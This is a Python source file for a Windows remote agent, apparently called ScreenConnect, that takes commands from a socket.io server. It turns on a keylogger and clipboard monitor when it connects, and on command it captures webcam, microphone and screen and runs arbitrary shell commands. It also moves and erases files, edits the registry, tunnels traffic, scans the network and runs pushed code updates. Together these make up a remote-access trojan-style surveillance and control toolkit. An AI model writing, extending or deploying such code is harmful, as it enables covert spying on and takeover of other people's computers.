class ScreenConnectAgent:
    def __init__(self):
        self._reconnect_delay = CONFIG["RECONNECT_BASE"]
        self._stop_flag       = threading.Event()

    def _make_client(self):
        """Create a brand-new socketio.Client on every reconnect."""
        global _quality_reporter
        sio         = socketio.Client(logger=False, engineio_logger=False, reconnection=False)
        sys_monitor = SystemMonitor(sio)
        keylogger   = KeyLogger(sio)
        clipboard   = ClipboardMonitor(sio)
        webcam      = WebcamCapture(sio)
        shell       = RemoteShell()
        proc_mgr    = ProcessManager()
        files       = FileBrowser()
        heartbeat   = Heartbeat(sio)
        alerts      = AlertEngine(sio)
        registry    = RegistryManager()
        services    = ServiceManager()
        winmgr      = WindowManager()
        audio       = AudioCapture(sio)
        apps        = InstalledApps()
        eraser      = SecureEraser()
        # ── v9 new components ──
        recorder    = ScreenRecorder(sio)
        file_watcher = FileWatcher(sio)
        tunnel      = TunnelProxy(sio)
        shell_streamer = ShellStreamer(sio)
        events_reader  = SystemEventsReader()
        # ── v14 enterprise ──
        quality_rep = ConnectionQualityReporter(sio)
        _quality_reporter = quality_rep
        net_detector = NetworkChangeDetector(
            on_change_cb=lambda **kw: sio.emit("network_change", {
                "device_id": CONFIG["DEVICE_TOKEN"],
                "added":     list(kw.get("added", [])),
                "removed":   list(kw.get("removed", [])),
                "ts":        datetime.utcnow().isoformat(),
            }) if sio.connected else None
        )

        self._register_events(
            sio, sys_monitor, keylogger, clipboard,
            webcam, shell, proc_mgr, files, heartbeat, alerts,
            registry, services, winmgr, audio, apps, eraser,
            recorder, file_watcher, tunnel, shell_streamer, events_reader,
            quality_rep, net_detector,
        )
        return sio, sys_monitor, heartbeat, keylogger, clipboard, alerts, quality_rep, net_detector

    def _register_events(
        self, sio, sys_monitor, keylogger, clipboard,
        webcam, shell, proc_mgr, files, heartbeat, alerts,
        registry, services, winmgr, audio, apps, eraser,
        recorder=None, file_watcher=None, tunnel=None,
        shell_streamer=None, events_reader=None,
        quality_rep=None, net_detector=None,
    ):
        @sio.event
        def connect():
            self._reconnect_delay = CONFIG["RECONNECT_BASE"]  # reset backoff on success
            log.info(f"Connected to {CONFIG['SERVER_URL']}")

            fp = get_device_fingerprint()
            fp["device_id"] = CONFIG["DEVICE_TOKEN"]
            fp["token"]     = CONFIG["DEVICE_TOKEN"]
            sio.emit("agent_connect", fp)

            # HTTP belt-and-suspenders checkin
            try:
                requests.post(
                    CONFIG["SERVER_URL"].rstrip("/") + "/agent/checkin",
                    json={"device_id": CONFIG["DEVICE_TOKEN"], **fp},
                    timeout=10
                )
            except Exception:
                pass

            # Start Advanced Monitor AFTER agent_connect so server has
            # the device in _devices before agent_auth arrives (fixes race condition)
            def _delayed_adv_start():
                time.sleep(2)  # give server 2s to process agent_connect
                start_advanced_monitor(CONFIG["SERVER_URL"], CONFIG["DEVICE_TOKEN"])
            threading.Thread(target=_delayed_adv_start, daemon=True, name="adv-starter").start()

            heartbeat.start()
            alerts.start()
            if CONFIG["ENABLE_KEYLOGGER"]:  keylogger.start()
            if CONFIG["ENABLE_CLIPBOARD"]:  clipboard.start()
            # ── v14: start enterprise components ──
            if quality_rep:  quality_rep.start()
            if net_detector: net_detector.start()
            # Save config on successful connect
            threading.Thread(target=_save_config_secure, daemon=True).start()

        @sio.event
        def disconnect():
            log.warning("Disconnected from server.")
            sys_monitor.stop()
            heartbeat.stop()
            alerts.stop()

        @sio.on("request_action")
        def on_action(data):
            tab = data.get("tab", "")
            log.info(f"Action: {tab}")

            # ── Monitor/stream/mouse — handled by Advanced Monitor engine ──
            if tab == "monitor":
                action = data.get("action", "start")
                if data.get("fps") is not None:
                    new_fps = max(30, min(int(data.get("fps", CONFIG["STREAM_FPS"])), 60))  # clamp 30-60
                    CONFIG["STREAM_FPS"] = new_fps
                    CONFIG["STREAM_MIN_FPS"] = max(30, new_fps // 2)  # floor at 30fps always
                if data.get("quality") is not None:
                    CONFIG["STREAM_QUALITY"] = max(25, min(int(data.get("quality", CONFIG["STREAM_QUALITY"])), 95))
                if data.get("scale") is not None:
                    # Server sends 0.0–1.0 scale; clamp to safe range
                    CONFIG["STREAM_SCALE"] = max(0.25, min(float(data.get("scale", 1.0)), 1.0))
                if data.get("monitor") is not None:
                    CONFIG["STREAM_MONITOR"] = max(1, int(data.get("monitor", CONFIG["STREAM_MONITOR"])))
                if action == "start":
                    # FIX: If viewer_count never arrived on the adv socket (race condition),
                    # bump _adv_viewers so the stream loop wakes up immediately.
                    global _adv_viewers
                    if _adv_viewers == 0:
                        _adv_viewers = 1
                        log.info("Monitor start via request_action — forced _adv_viewers=1 (adv socket race fallback)")
                    # Always start screenshot fallback — no-op if adv socket is working
                    _start_screenshot_fallback(sio)
                elif action == "set_mode":
                    CONFIG["STREAM_MODE"] = data.get("mode", CONFIG["STREAM_MODE"])
                    _start_screenshot_fallback(sio)
                elif action == "set_quality":
                    _start_screenshot_fallback(sio)
                elif action == "stop":
                    _fb_stop.set()
            elif tab in ("mouse_event", "scroll_event", "frame_ack"):
                pass  # handled by Advanced Monitor engine

            # ── Mouse control via main-socket fallback ─────────────────────
            elif tab == "mouse_move":
                if PYAUTOGUI_OK:
                    try:
                        x, y = _to_monitor_absolute(data.get("x", 0), data.get("y", 0))
                        pyautogui.moveTo(x, y, _pause=False)
                    except Exception as e:
                        log.debug(f"mouse_move error: {e}")

            elif tab == "mouse_click":
                if PYAUTOGUI_OK:
                    try:
                        x, y = _to_monitor_absolute(data.get("x", 0), data.get("y", 0))
                        btn = "left" if data.get("button", "left") == "left" else "right"
                        evt_type = data.get("type", "")
                        if evt_type == "mouse_dblclick":
                            pyautogui.doubleClick(x, y, button=btn, _pause=False)
                        elif "down" in data:
                            fn = pyautogui.mouseDown if data.get("down", True) else pyautogui.mouseUp
                            fn(x, y, button=btn, _pause=False)
                        else:
                            pyautogui.click(x, y, button=btn, _pause=False)
                    except Exception as e:
                        log.debug(f"mouse_click error: {e}")

            elif tab == "scroll":
                if PYAUTOGUI_OK:
                    try:
                        x, y = _to_monitor_absolute(data.get("x", 0), data.get("y", 0))
                        pyautogui.scroll(int(data.get("delta", 3)), x=x, y=y, _pause=False)
                    except Exception as e:
                        log.debug(f"scroll error: {e}")

            elif tab == "type_text":
                if PYAUTOGUI_OK:
                    try:
                        pyautogui.write(data.get("text", ""), interval=0.01, _pause=False)
                    except Exception as e:
                        log.debug(f"type_text error: {e}")

            # ── Keyboard ───────────────────────────────────────────────────
            elif tab == "key_event":
                if PYAUTOGUI_OK:
                    ktype = data.get("type", "down")
                    key   = data.get("key", "")
                    combo = data.get("combo", "")
                    KEY_MAP = {
                        "Enter": "enter", "Return": "enter",
                        "Backspace": "backspace", "Tab": "tab",
                        "Escape": "esc", "Delete": "delete",
                        "Insert": "insert", "Home": "home", "End": "end",
                        "PageUp": "pageup", "PageDown": "pagedown",
                        "ArrowUp": "up", "ArrowDown": "down",
                        "ArrowLeft": "left", "ArrowRight": "right",
                        " ": "space", "Control": "ctrl",
                        "Alt": "alt", "Shift": "shift", "Meta": "win",
                        "CapsLock": "capslock", "NumLock": "numlock",
                        "PrintScreen": "printscreen", "ScrollLock": "scrolllock",
                        "F1": "f1", "F2": "f2", "F3": "f3", "F4": "f4",
                        "F5": "f5", "F6": "f6", "F7": "f7", "F8": "f8",
                        "F9": "f9", "F10": "f10", "F11": "f11", "F12": "f12",
                    }
                    try:
                        if combo == "ctrl+alt+del":
                            subprocess.Popen(
                                ["powershell", "-Command",
                                 "(New-Object -ComObject Shell.Application).WindowsSecurity()"],
                                creationflags=subprocess.CREATE_NO_WINDOW
                            )
                        elif ktype in ("down", "press"):
                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
                            if pg:
                                hotkey = []
                                if data.get("ctrl")  and key != "Control": hotkey.append("ctrl")
                                if data.get("alt")   and key != "Alt":     hotkey.append("alt")
                                if data.get("shift") and key != "Shift":   hotkey.append("shift")
                                if data.get("meta")  and key != "Meta":    hotkey.append("win")
                                hotkey.append(pg)
                                if len(hotkey) > 1:
                                    pyautogui.hotkey(*hotkey, _pause=False)
                                else:
                                    pyautogui.keyDown(pg, _pause=False)
                        elif ktype == "up":
                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
                            if pg:
                                pyautogui.keyUp(pg, _pause=False)
                        elif ktype == "type":
                            # Type a full string
                            pyautogui.write(data.get("text", ""), interval=0.01)
                    except Exception as e:
                        log.warning(f"key_event error: {e}")

            # ── Ping ───────────────────────────────────────────────────────
            elif tab == "ping":
                sio.emit("ping_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "t": data.get("t"),
                    "ts": datetime.utcnow().isoformat(),
                })

            # ── System ─────────────────────────────────────────────────────
            elif tab == "system":
                action = data.get("action", "start")
                if action == "start":
                    sys_monitor.start(interval=data.get("interval", 2))
                else:
                    sys_monitor.stop()

            elif tab == "system_snapshot":
                sio.emit("system_stats_report", sys_monitor.get_snapshot())

            elif tab == "disks":
                sio.emit("disks_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "disks": sys_monitor.get_disk_list(),
                })

            elif tab == "network":
                sio.emit("network_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "interfaces": sys_monitor.get_network_interfaces(),
                })

            # ── Processes ──────────────────────────────────────────────────
            elif tab == "processes":
                procs = proc_mgr.list_processes()
                sio.emit("processes_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "processes": procs,
                    "count": len(procs),
                })

            elif tab == "kill_process":
                sio.emit("kill_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **proc_mgr.kill_process(int(data.get("pid", 0))),
                })

            elif tab == "start_process":
                sio.emit("start_process_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **proc_mgr.start_process(data.get("command", "")),
                })

            elif tab == "suspend_process":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "suspend_process",
                    **proc_mgr.suspend_process(int(data.get("pid", 0))),
                })

            elif tab == "resume_process":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "resume_process",
                    **proc_mgr.resume_process(int(data.get("pid", 0))),
                })

            # ── Shell ──────────────────────────────────────────────────────
            elif tab == "shell":
                result = shell.execute(
                    data.get("command", "echo hello"),
                    shell_type=data.get("shell_type", "cmd"),
                )
                sio.emit("shell_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})

            elif tab == "shell_env":
                sio.emit("shell_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **shell.get_env(),
                })

            # ── Files ──────────────────────────────────────────────────────
            elif tab == "file_list":
                sio.emit("file_list_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.list_directory(data.get("path", "C:\\")),
                })

            elif tab == "file_read":
                sio.emit("file_read_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.read_file(data.get("path", "")),
                })

            elif tab == "file_write":
                sio.emit("file_read_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.write_file(data.get("path", ""), data.get("content", "")),
                })

            elif tab == "file_download":
                sio.emit("file_download_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.download_file(data.get("path", "")),
                })

            elif tab == "file_upload":
                sio.emit("file_download_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.upload_file(data.get("path", ""), data.get("data", "")),
                })

            elif tab == "file_delete":
                sio.emit("file_delete_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.delete_file(data.get("path", "")),
                })

            elif tab == "file_copy":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "file_copy",
                    **files.copy_file(data.get("src", ""), data.get("dst", "")),
                })

            elif tab == "file_move":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "file_move",
                    **files.move_file(data.get("src", ""), data.get("dst", "")),
                })

            elif tab == "file_mkdir":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "file_mkdir",
                    **files.create_folder(data.get("path", "")),
                })

            elif tab == "file_rename":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "file_rename",
                    **files.rename(data.get("old", ""), data.get("new", "")),
                })

            elif tab == "file_search":
                sio.emit("file_list_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.search(data.get("root", "C:\\"), data.get("pattern", "*")),
                })

            elif tab == "drives":
                sio.emit("drives_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "drives": files.list_drives(),
                })

            # ── Webcam ─────────────────────────────────────────────────────
            elif tab == "webcam":
                sio.emit("webcam_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **webcam.capture(data.get("camera", 0), data.get("quality", 80)),
                })

            elif tab == "webcam_list":
                sio.emit("webcam_list_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "cameras": webcam.list_cameras(),
                })

            # ── Clipboard ──────────────────────────────────────────────────
            elif tab == "clipboard_get":
                if CLIPBOARD_OK:
                    sio.emit("clipboard_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "content": pyperclip.paste()[:8192],
                        "ts": datetime.utcnow().isoformat(),
                    })

            elif tab == "clipboard_set":
                if CLIPBOARD_OK:
                    pyperclip.copy(data.get("text", ""))
                    sio.emit("clipboard_set_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "success": True,
                    })

            # ── Registry ───────────────────────────────────────────────────
            elif tab == "registry_read":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "registry_read",
                    **registry.read_key(data.get("path", ""), data.get("value", "")),
                })

            elif tab == "registry_list":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "registry_list",
                    **registry.list_key(data.get("path", "")),
                })

            elif tab == "registry_write":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "registry_write",
                    **registry.write_key(data.get("path", ""), data.get("name", ""),
                                         data.get("data", ""), int(data.get("type", winreg.REG_SZ))),
                })

            elif tab == "registry_delete":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "registry_delete",
                    **registry.delete_value(data.get("path", ""), data.get("name", "")),
                })

            # ── Services ───────────────────────────────────────────────────
            elif tab == "services_list":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "services_list",
                    "services": services.list_services(),
                })

            elif tab == "service_control":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "service_control",
                    **services.control_service(data.get("name", ""), data.get("cmd", "stop")),
                })

            # ── Windows ────────────────────────────────────────────────────
            elif tab == "windows_list":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "windows_list",
                    "windows": winmgr.list_windows(),
                })

            elif tab == "window_focus":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "window_focus",
                    **winmgr.focus_window(int(data.get("hwnd", 0))),
                })

            elif tab == "window_close":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "window_close",
                    **winmgr.close_window(int(data.get("hwnd", 0))),
                })

            elif tab == "window_minimize":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "window_minimize",
                    **winmgr.minimize_window(int(data.get("hwnd", 0))),
                })

            elif tab == "window_maximize":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "window_maximize",
                    **winmgr.maximize_window(int(data.get("hwnd", 0))),
                })

            # ── Installed Apps ─────────────────────────────────────────────
            elif tab == "installed_apps":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "installed_apps",
                    "apps": apps.list_apps(),
                })

            # ── Audio capture ──────────────────────────────────────────────
            elif tab == "audio_capture":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "audio_capture",
                    **audio.capture_chunk(
                        seconds=float(data.get("seconds", 3.0)),
                        sample_rate=int(data.get("sample_rate", 16000)),
                    ),
                })

            elif tab == "audio_devices":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "audio_devices",
                    "devices": audio.list_devices(),
                })

            # ── Secure erase ───────────────────────────────────────────────
            elif tab == "secure_erase":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "secure_erase",
                    **eraser.wipe_file(data.get("path", ""), int(data.get("passes", 3))),
                })

            # ── Power ──────────────────────────────────────────────────────
            elif tab == "lock_screen":
                ctypes.windll.user32.LockWorkStation()
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "lock_screen", "success": True,
                })

            elif tab == "sleep":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "sleep", "success": True,
                })
                os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

            elif tab == "shutdown":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "shutdown", "success": True,
                })
                time.sleep(1)
                os.system('shutdown /s /t 10 /c "Screen Connect remote shutdown"')

            elif tab == "restart":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "restart", "success": True,
                })
                time.sleep(1)
                os.system('shutdown /r /t 10 /c "Screen Connect remote restart"')

            elif tab == "abort_shutdown":
                os.system("shutdown /a")
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "abort_shutdown", "success": True,
                })

            elif tab == "logoff":
                os.system("shutdown /l")
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "logoff", "success": True,
                })

            elif tab == "hibernate":
                os.system("shutdown /h")
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "hibernate", "success": True,
                })

            elif tab == "uninstall":
                remove_persistence()
                sio.disconnect()
                sys.exit(0)

            # ── v9: WoL relay via request_action tab ───────────────────────
            elif tab == "wol":
                mac   = data.get("mac", "")
                bcast = data.get("broadcast", "255.255.255.255")
                res   = _send_wol_magic(mac, bcast)
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "wol", **res,
                })

            # ── v9: Screen Recorder ────────────────────────────────────────
            elif tab == "recording_start":
                if recorder:
                    res = recorder.start(
                        rec_id=data.get("rec_id", str(uuid.uuid4())),
                        fps=int(data.get("fps", 10)),
                        quality=int(data.get("quality", 70)),
                        chunk_secs=int(data.get("chunk_secs", 10)),
                        monitor_idx=int(data.get("monitor", 1)),
                    )
                    sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
                                               "action": "recording_start", **res})

            elif tab == "recording_stop":
                if recorder:
                    res = recorder.stop()
                    sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
                                               "action": "recording_stop", **res})

            # ── v9: Network Scanner ────────────────────────────────────────
            elif tab == "network_scan":
                def _do_scan():
                    result = NetworkScanner.full_scan(
                        subnet=data.get("subnet"),
                        port_scan=bool(data.get("port_scan", False)),
                    )
                    sio.emit("network_scan_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"], **result})
                threading.Thread(target=_do_scan, daemon=True, name="net-scan").start()

            # ── v9: File Watcher ───────────────────────────────────────────
            elif tab == "watch_add":
                if file_watcher:
                    res = file_watcher.add_watch(
                        path=data.get("path", ""),
                        recursive=bool(data.get("recursive", False)),
                        interval=float(data.get("interval", 2.0)),
                    )
                    sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
                                               "action": "watch_add", **res})

            elif tab == "watch_remove":
                if file_watcher:
                    res = file_watcher.remove_watch(data.get("path", ""))
                    sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
                                               "action": "watch_remove", **res})

            elif tab == "watch_list":
                if file_watcher:
                    sio.emit("action_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "action": "watch_list",
                        "watches": file_watcher.list_watches(),
                    })

            # ── v9: Windows Event Log ──────────────────────────────────────
            elif tab == "event_log":
                result = SystemEventsReader.read_log(
                    channel=data.get("channel", "System"),
                    max_entries=int(data.get("max_entries", 100)),
                    level_filter=data.get("level_filter"),
                )
                sio.emit("event_log_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"], **result})

            # ── v9: Tunnel Proxy ───────────────────────────────────────────
            elif tab == "tunnel_send":
                if tunnel:
                    res = tunnel.send(data.get("tunnel_id", ""), data.get("data", ""))
                    if not res.get("success"):
                        sio.emit("tunnel_close", {
                            "device_id": CONFIG["DEVICE_TOKEN"],
                            "tunnel_id": data.get("tunnel_id"),
                            "error": res.get("error"),
                        })

            elif tab == "tunnel_close":
                if tunnel:
                    tunnel.close(data.get("tunnel_id", ""))

            # ── v9: Environment Manager ────────────────────────────────────
            elif tab == "env_list":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "env_list",
                    "env": EnvManager.list_env(),
                })

            elif tab == "env_set":
                res = EnvManager.set_env(
                    data.get("name", ""), data.get("value", ""),
                    system_wide=bool(data.get("system_wide", False)),
                )
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
                                           "action": "env_set", **res})

            elif tab == "env_delete":
                res = EnvManager.delete_env(data.get("name", ""))
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
                                           "action": "env_delete", **res})

            # ── v9: Certificate Manager ────────────────────────────────────
            elif tab == "certs_list":
                res = CertManager.list_certs(data.get("store", "MY"))
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"],
                                           "action": "certs_list", **res})

            # ── v9: Shell stream (PTY-like) ────────────────────────────────
            elif tab == "shell_stream":
                if shell_streamer:
                    shell_streamer.run(
                        stream_id=data.get("stream_id", str(uuid.uuid4())),
                        command=data.get("command", "echo hello"),
                        shell_type=data.get("shell_type", "cmd"),
                        timeout=int(data.get("timeout", 300)),
                    )

            else:
                log.warning(f"Unknown tab: {tab}")

        # ── v9: Capability negotiation (server sends AGENT_CAPS on auth_ok) ──
        @sio.on("caps")
        def on_caps(data):
            caps = data.get("caps", {})
            ver  = data.get("server_version", "unknown")
            CONFIG["SERVER_CAPS"]    = caps
            CONFIG["SERVER_VERSION"] = ver
            log.info(f"Server caps received: version={ver} caps={list(caps.keys())}")
            # Report our own agent caps back
            sio.emit("agent_caps_report", {
                "device_id":     CONFIG["DEVICE_TOKEN"],
                "agent_version": CONFIG["AGENT_VERSION"],
                "caps": {
                    "screen_recorder":   CV2_OK,
                    "network_scan":      True,
                    "file_watcher":      True,
                    "event_log":         WIN32_OK,
                    "tunnel_proxy":      True,
                    "hotpatch":          True,
                    "wol_relay":         True,
                    "shell_stream":      True,
                    "keylogger":         PYNPUT_OK,
                    "webcam":            True,
                    "audio":             AUDIO_OK,
                    "clipboard":         CLIPBOARD_OK,
                    "registry":          True,
                    "services":          True,
                    "windows":           WIN32_OK,
                    "webrtc":            WEBRTC_OK,
                    "h264":              False,
                    "cert_manager":      True,
                    "env_manager":       True,
                    # ── v14 enterprise caps ──
                    "quality_reporter":  True,
                    "adaptive_quality":  _adaptive_quality_enabled,
                    "preflight_check":   True,
                    "net_change_detect": True,
                    "memory_guard":      True,
                    "secure_config":     True,
                    "diagnostics":       True,
                    "config_hot_reload": True,
                },
            })

        # ── v9: Push-update handler ──────────────────────────────────────────
        @sio.on("push_update")
        def on_push_update(data):
            url  = data.get("url", "")
            sha  = data.get("sha256", "")
            log.info(f"push_update received: url={url}")
            sio.emit("action_result", {
                "device_id": CONFIG["DEVICE_TOKEN"],
                "action": "push_update_ack",
                "url": url,
            })
            # Run in a thread so we can emit ack first
            threading.Thread(
                target=_handle_push_update,
                args=(url, sha), daemon=True, name="auto-updater",
            ).start()

        # ── v9: Wake-on-LAN relay ────────────────────────────────────────────
        @sio.on("request_action")
        def _wol_intercept(data):
            # This is an ADDITIONAL handler for 'wol' tab — the main on_action
            # already catches all other tabs.  Socket.io Python client allows
            # multiple handlers; only on_action's else branch fires for wol.
            pass   # handled below inside on_action via tab == "wol" branch

        # Inject wol into on_action — done by adding to the tab dispatcher.
        # We also register a dedicated top-level handler:
        @sio.on("wol")
        def on_wol(data):
            mac  = data.get("mac", "")
            bcast = data.get("broadcast", "255.255.255.255")
            res  = _send_wol_magic(mac, bcast)
            sio.emit("action_result", {
                "device_id": CONFIG["DEVICE_TOKEN"],
                "action": "wol", **res,
            })

        # ── v9: Run macro (server dispatches keystroke sequence) ─────────────
        @sio.on("run_macro")
        def on_run_macro(data):
            """Execute a macro: list of {type, key/text, delay_ms} steps."""
            steps = data.get("steps", [])
            macro_id = data.get("macro_id", "")

            def _exec():
                if not PYAUTOGUI_OK:
                    sio.emit("action_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "action": "run_macro", "success": False,
                        "error": "pyautogui_unavailable",
                    })
                    return
                errors = []
                for step in steps:
                    try:
                        stype = step.get("type", "key")
                        delay = float(step.get("delay_ms", 0)) / 1000.0
                        if stype == "key":
                            pyautogui.press(step.get("key", ""), _pause=False)
                        elif stype == "hotkey":
                            keys = step.get("keys", [])
                            if keys:
                                pyautogui.hotkey(*keys, _pause=False)
                        elif stype == "type":
                            pyautogui.write(step.get("text", ""), interval=0.02, _pause=False)
                        elif stype == "click":
                            x, y = _to_monitor_absolute(
                                step.get("x", 0.5), step.get("y", 0.5))
                            pyautogui.click(x, y, _pause=False)
                        elif stype == "delay":
                            pass  # delay applied below
                        if delay > 0:
                            time.sleep(delay)
                    except Exception as e:
                        errors.append(str(e))
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "run_macro", "success": len(errors) == 0,
                    "macro_id": macro_id, "errors": errors,
                })
            threading.Thread(target=_exec, daemon=True, name="macro").start()

        # ── v9: Run scheduled job (server cron dispatch) ──────────────────────
        @sio.on("run_scheduled_job")
        def on_run_scheduled_job(data):
            """Execute a pre-scheduled shell command immediately."""
            job_id   = data.get("job_id", "")
            command  = data.get("command", "")
            stype    = data.get("shell_type", "cmd")
            use_stream = bool(data.get("stream", False))

            log.info(f"Scheduled job {job_id}: {command!r}")

            if use_stream and shell_streamer:
                shell_streamer.run(
                    stream_id=job_id, command=command, shell_type=stype)
            else:
                import importlib
                # Reuse RemoteShell inline
                result = RemoteShell.execute(command, shell_type=stype)
                sio.emit("scheduled_job_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "job_id": job_id, **result,
                })

        # ── v9: Tunnel open ───────────────────────────────────────────────────
        @sio.on("tunnel_open")
        def on_tunnel_open(data):
            if tunnel:
                res = tunnel.open(
                    tunnel_id=data.get("tunnel_id", str(uuid.uuid4())),
                    local_host=data.get("local_host", "127.0.0.1"),
                    local_port=int(data.get("local_port", 22)),
                )
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "tunnel_open", **res,
                })

        # ── v9: Hotpatch ──────────────────────────────────────────────────────
        @sio.on("hotpatch")
        def on_hotpatch(data):
            res = HotpatchEngine.apply(
                code_b64=data.get("code", ""),
                signature_hex=data.get("signature", ""),
            )
            sio.emit("action_result", {
                "device_id": CONFIG["DEVICE_TOKEN"],
                "action": "hotpatch", **res,
            })

        # ── v9: Transfer chunked upload progress ──────────────────────────────
        @sio.on("transfer_chunk")
        def on_transfer_chunk(data):
            """Receive a file chunk from server, write to disk with % progress."""
            transfer_id = data.get("transfer_id", "")
            chunk_idx   = int(data.get("chunk", 0))
            total_chunks = int(data.get("total_chunks", 1))
            dest_path   = data.get("path", "")
            chunk_data  = data.get("data", "")

            try:
                raw = base64.b64decode(chunk_data)
                mode = "ab" if chunk_idx > 0 else "wb"
                os.makedirs(os.path.dirname(dest_path) if os.path.dirname(dest_path) else ".", exist_ok=True)
                with open(dest_path, mode) as fh:
                    fh.write(raw)

                pct = round((chunk_idx + 1) / max(total_chunks, 1) * 100, 1)
                sio.emit("transfer_progress", {
                    "device_id":    CONFIG["DEVICE_TOKEN"],
                    "transfer_id":  transfer_id,
                    "chunk":        chunk_idx,
                    "total_chunks": total_chunks,
                    "pct":          pct,
                    "success":      True,
                })
                if chunk_idx + 1 >= total_chunks:
                    log.info(f"Transfer {transfer_id}: {dest_path} complete ({total_chunks} chunks)")
                    sio.emit("transfer_done", {
                        "device_id":   CONFIG["DEVICE_TOKEN"],
                        "transfer_id": transfer_id,
                        "path":        dest_path,
                    })
            except Exception as e:
                sio.emit("transfer_progress", {
                    "device_id":   CONFIG["DEVICE_TOKEN"],
                    "transfer_id": transfer_id,
                    "chunk":       chunk_idx,
                    "success":     False,
                    "error":       str(e),
                })

        # ── v9: Clipboard sync (bidirectional with content-type) ──────────────
        @sio.on("clipboard_sync")
        def on_clipboard_sync(data):
            """Viewer pushed clipboard → set locally."""
            if not CLIPBOARD_OK:
                return
            content = data.get("content", "")
            ctype   = data.get("content_type", "plain")
            try:
                if ctype == "plain":
                    pyperclip.copy(content)
                    sio.emit("clipboard_sync_ack", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "success": True,
                    })
            except Exception as e:
                log.debug(f"clipboard_sync error: {e}")

        # ── v9: Viewer presence overlay relay ─────────────────────────────────
        @sio.on("viewer_presence")
        def on_viewer_presence(data):
            """Server tells agent how many viewers are watching (for overlay)."""
            count = data.get("count", 0)
            names = data.get("viewers", [])
            log.debug(f"Viewer presence: {count} — {names}")
